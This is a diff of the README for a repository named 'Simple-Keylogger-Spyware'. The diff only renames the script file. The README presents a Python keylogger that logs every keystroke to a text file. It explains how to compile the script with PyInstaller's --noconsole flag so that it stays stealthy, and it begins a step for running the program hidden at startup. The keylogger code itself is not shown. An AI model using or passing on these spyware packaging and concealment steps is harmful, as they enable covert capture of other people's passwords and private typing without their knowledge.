@@ -1,8 +1,8 @@
 # Simple-Keylogger-Spyware
 A python code for a simple keylogger application that records all key strokes while application is running.
 
-# Download keylogger.py file
-executing keylogger.py will start the recording and updating all recorded keys in keylog.txt file in the same folder
+# Download simple-keylogger.py file
+executing simple-keylogger.py will start the recording and updating all recorded keys in keylog.txt file in the same folder
 
 # To convert this file into an executable
 1. install PyInstaller
@@ -13,7 +13,7 @@ executing keylogger.py will start the recording and updating all recorded keys i
 
 2. use this command to convert python file to an executable
 
-> ' python -m PyInstaller --noconsole --onefile keylogger.py '
+> ' python -m PyInstaller --noconsole --onefile simple-keylogger.py '
 
 > ' --noconsole ' supresses console output to maintain stealth of the application
 
@@ -21,7 +21,7 @@ executing keylogger.py will start the recording and updating all recorded keys i
  
 > this process may take some time
 
-> after completion, the application file (keylogger.exe) will be available in 'dist' folder
+> after completion, the application file (simple-keylogger.exe) will be available in 'dist' folder
 
 3. to execute application on startup (hidden and running in background)
 
